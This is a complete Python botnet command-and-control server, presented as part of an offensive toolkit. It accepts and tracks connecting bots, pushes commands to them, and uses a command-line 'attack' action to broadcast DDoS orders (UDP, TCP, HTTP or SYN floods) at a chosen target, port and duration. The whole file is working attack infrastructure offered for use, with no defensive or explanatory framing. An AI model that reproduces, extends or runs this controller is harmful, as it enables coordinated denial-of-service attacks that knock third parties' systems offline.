#!/usr/bin/env python3
"""
Botnet C2 Controller - WHOAMISec Offensive Toolkit
Advanced botnet command and control interface
"""

import sys
import argparse
import socket
import threading
import json
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

class BotnetC2:
    def __init__(self, host='0.0.0.0', port=1337):
        self.host = host
        self.port = port
        self.bots = {}  # {ip: {'status': 'online', 'last_seen': timestamp, 'os': 'linux'}}
        self.attacks = []
        self.running = False
        self.server_socket = None
        
    def start_server(self):
        """Start the C2 server"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(100)
        self.running = True
        
        print(f"[*] Botnet C2 Server started on {self.host}:{self.port}")
        
        # Start accepting connections
        accept_thread = threading.Thread(target=self.accept_connections)
        accept_thread.daemon = True
        accept_thread.start()
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.monitor_bots)
        monitor_thread.daemon = True
        monitor_thread.start()
    
    def accept_connections(self):
        """Accept incoming bot connections"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                print(f"[+] New bot connected from {address[0]}:{address[1]}")
                
                # Handle bot in new thread
                bot_thread = threading.Thread(target=self.handle_bot, args=(client_socket, address))
                bot_thread.daemon = True
                bot_thread.start()
            except:
                continue
    
    def handle_bot(self, client_socket, address):
        """Handle individual bot connection"""
        bot_ip = address[0]
        
        try:
            # Send welcome message
            welcome_msg = "HELLO|C2|WHOAMISec-Botnet\n"
            client_socket.send(welcome_msg.encode())
            
            # Receive bot info
            data = client_socket.recv(1024).decode().strip()
            if data.startswith("BOTINFO|"):
                bot_info = data.split("|")[1]
                self.bots[bot_ip] = {
                    'status': 'online',
                    'last_seen': datetime.now(),
                    'os': bot_info,
                    'socket': client_socket
                }
                print(f"[+] Bot {bot_ip} registered - OS: {bot_info}")
            
            # Keep connection alive and handle commands
            while self.running:
                try:
                    # Send heartbeat
                    client_socket.send("PING\n".encode())
                    
                    # Receive response
                    response = client_socket.recv(1024).decode().strip()
                    if response == "PONG":
                        self.bots[bot_ip]['last_seen'] = datetime.now()
                    
                    time.sleep(30)  # Heartbeat every 30 seconds
                except:
                    break
                    
        except Exception as e:
            print(f"[-] Bot {bot_ip} disconnected: {e}")
        finally:
            # Remove bot from list
            if bot_ip in self.bots:
                del self.bots[bot_ip]
            client_socket.close()
    
    def monitor_bots(self):
        """Monitor bot status and remove offline bots"""
        while self.running:
            current_time = datetime.now()
            offline_bots = []
            
            for bot_ip, bot_info in list(self.bots.items()):
                last_seen = bot_info['last_seen']
                if (current_time - last_seen).total_seconds() > 120:  # 2 minutes timeout
                    offline_bots.append(bot_ip)
            
            # Remove offline bots
            for bot_ip in offline_bots:
                print(f"[-] Bot {bot_ip} marked as offline")
                if bot_ip in self.bots:
                    try:
                        self.bots[bot_ip]['socket'].close()
                    except:
                        pass
                    del self.bots[bot_ip]
            
            time.sleep(60)  # Check every minute
    
    def send_command(self, bot_ip, command):
        """Send command to specific bot"""
        if bot_ip in self.bots:
            try:
                self.bots[bot_ip]['socket'].send(f"COMMAND|{command}\n".encode())
                print(f"[+] Command sent to {bot_ip}: {command}")
                return True
            except Exception as e:
                print(f"[-] Failed to send command to {bot_ip}: {e}")
                return False
        else:
            print(f"[-] Bot {bot_ip} not found")
            return False
    
    def broadcast_command(self, command):
        """Broadcast command to all bots"""
        success_count = 0
        for bot_ip in list(self.bots.keys()):
            if self.send_command(bot_ip, command):
                success_count += 1
        
        print(f"[+] Command broadcasted to {success_count}/{len(self.bots)} bots")
        return success_count
    
    def launch_attack(self, target, port, duration, method="UDP"):
        """Launch DDoS attack"""
        attack_cmd = f"ATTACK|{target}|{port}|{duration}|{method}"
        success_count = self.broadcast_command(attack_cmd)
        
        attack_info = {
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'bots_used': success_count,
            'timestamp': datetime.now().isoformat()
        }
        self.attacks.append(attack_info)
        
        print(f"[+] Attack launched: {method} on {target}:{port} for {duration}s using {success_count} bots")
        return attack_info
    
    def get_status(self):
        """Get C2 server status"""
        return {
            'server_running': self.running,
            'total_bots': len(self.bots),
            'online_bots': len([b for b in self.bots.values() if b['status'] == 'online']),
            'total_attacks': len(self.attacks),
            'bots': {ip: {'status': info['status'], 'os': info['os'], 'last_seen': info['last_seen'].isoformat()} 
                    for ip, info in self.bots.items()}
        }
    
    def stop_server(self):
        """Stop the C2 server"""
        self.running = False
        
        # Close all bot connections
        for bot_ip, bot_info in list(self.bots.items()):
            try:
                bot_info['socket'].close()
            except:
                pass
        
        # Close server socket
        if self.server_socket:
            self.server_socket.close()
        
        print("[*] Botnet C2 Server stopped")

def main():
    parser = argparse.ArgumentParser(description='Botnet C2 Controller - WHOAMISec Toolkit')
    parser.add_argument('--host', default='0.0.0.0', help='C2 server host (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=1337, help='C2 server port (default: 1337)')
    parser.add_argument('--action', required=True, choices=['start', 'status', 'attack', 'stop'], help='Action to perform')
    parser.add_argument('--target', help='Attack target (for attack action)')
    parser.add_argument('--target-port', type=int, default=80, help='Target port (for attack action)')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds (for attack action)')
    parser.add_argument('--method', default='UDP', choices=['UDP', 'TCP', 'HTTP', 'SYN'], help='Attack method (for attack action)')
    parser.add_argument('--output', choices=['json', 'text'], default='json', help='Output format')
    
    args = parser.parse_args()
    
    c2 = BotnetC2(args.host, args.port)
    
    if args.action == 'start':
        try:
            c2.start_server()
            # Keep server running
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down C2 server...")
            c2.stop_server()
    
    elif args.action == 'status':
        status = c2.get_status()
        if args.output == 'json':
            print(json.dumps({
                "tool": "botnet-c2-controller",
                "timestamp": datetime.now().isoformat(),
                "status": status
            }, indent=2))
        else:
            print(f"C2 Server Status:")
            print(f"  Running: {status['server_running']}")
            print(f"  Total Bots: {status['total_bots']}")
            print(f"  Online Bots: {status['online_bots']}")
            print(f"  Total Attacks: {status['total_attacks']}")
    
    elif args.action == 'attack':
        if not args.target:
            print("Error: --target required for attack action")
            sys.exit(1)
        
        # Start server temporarily for attack
        c2.start_server()
        time.sleep(2)  # Give time for bots to connect
        
        attack_info = c2.launch_attack(args.target, args.target_port, args.duration, args.method)
        
        if args.output == 'json':
            print(json.dumps({
                "tool": "botnet-c2-controller",
                "timestamp": datetime.now().isoformat(),
                "attack": attack_info
            }, indent=2))
        else:
            print(f"Attack launched successfully!")
            print(f"Target: {attack_info['target']}:{attack_info['port']}")
            print(f"Duration: {attack_info['duration']}s")
            print(f"Method: {attack_info['method']}")
            print(f"Bots used: {attack_info['bots_used']}")
        
        # Wait for attack duration
        time.sleep(args.duration)
        c2.stop_server()
    
    elif args.action == 'stop':
        c2.stop_server()

if __name__ == '__main__':
    main()